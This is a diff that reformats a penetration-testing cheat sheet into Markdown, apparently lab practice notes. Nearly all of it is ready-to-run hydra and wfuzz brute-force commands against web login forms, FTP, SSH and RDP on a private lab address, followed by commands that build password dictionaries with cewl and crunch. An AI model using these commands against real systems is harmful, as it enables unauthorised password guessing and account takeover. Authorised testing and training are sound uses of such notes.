@@ -1,38 +1,39 @@
-=================================== 
-Basic Webform
+--- 
+# Basic Webform
 
-hydra -t 1 -l admin -P $smallpw -vV http-get://192.168.200.5/nibbleblog/admin.php
-wfuzz -z file,$commontenk -d "uname=FUZZ&pass=FUZZ" --hc 302 http://192.168.200.5/login.php
+- `hydra -t 1 -l admin -P $smallpw -vV http-get://192.168.200.5/nibbleblog/admin.php`
+- `wfuzz -z file,$commontenk -d "uname=FUZZ&pass=FUZZ" --hc 302 http://192.168.200.5/login.php`
 
 
-===================================
-HTTP-POST (BURP for Help)
+---
+# HTTP-POST (BURP for Help)
 
-Usernames
-hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/wp-login.php:user=^USER^&pwd=^PASS^&wp-submit=Log+In:=Invalid username" 
-hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" 
+### Usernames
+- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/wp-login.php:user=^USER^&pwd=^PASS^&wp-submit=Log+In:=Invalid username" 
+- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" ``
 
-Bruteforce
-hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!" 
-hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect" 
-hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" 
-hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed" 
-hydra -vV -l root@localhost -P ./dict.txt -f -t 64 192.168.200.5 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I 
+### Bruteforce
+- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!" `
+- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect" `
+- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" `
+- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed" `
+- `hydra -vV -l root@localhost -P ./dict.txt -f -t 64 192.168.200.5 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I `
 
-===================================
-FTP
-hydra -l bob -P $smallpw 192.168.200.5 ftp -V -f  
+---
+# FTP
+- `hydra -l bob -P $smallpw 192.168.200.5 ftp -V -f  `
 
-SSH
-hydra -f -V -I -t 50 -l sunny -P $rockyou 192.168.200.5 ssh -s 22022
+# SSH
+- `hydra -f -V -I -t 50 -l sunny -P $rockyou 192.168.200.5 ssh -s 22022`
 
-RDP
-hydra -V -f -t 1 -L users.txt -P dict.txt rdp://192.168.200.5  
-hydra -V -f -t 1 -l cory -P $commontenk rdp://192.168.200.5
+# RDP
+- `hydra -V -f -t 1 -L users.txt -P dict.txt rdp://192.168.200.5  `
+- `hydra -V -f -t 1 -l cory -P $commontenk rdp://192.168.200.5`
 
-=================================== 
-Dictionary
+--- 
+# Dictionary
 
+```bash
 cat biglist.txt | sort -u | pw-inspector -m 6 -M 63 > dict.txt
 grep -i nibble $rockyou > dict.txt 
 cewl 192.168.200.5/otrs/index.pl -m 4 -w cewl.txt  
@@ -42,9 +43,10 @@ echo '314159265' >> dict.txt
 crunch 24 24 -t ThisIsUserPassword%%  > dict.txt 
 crunch 25 25 -t ThisIsAdminPassword%% >> dict.txt 
 
-$commontenk   ..10k-most-common.txt            ..good medium list
-$smallpw      ..raft-small-words.txt           ..short list
-$besttenfifty ..best1050.txt                   ..short list 
-$ftpdefaults  ..ftp-betterdefaultpasslist.txt  ..default pws
-$rockyou      ..rockyou.txt                    ..thorough
+$commontenk    ..10k-most-common.txt            ..good medium list
+$smallpw       ..raft-small-words.txt           ..short list
+$besttenfifty  ..best1050.txt                   ..short list 
+$ftpdefaults   ..ftp-betterdefaultpasslist.txt  ..default pws
+$rockyou       ..rockyou.txt                    ..thorough
+```
 
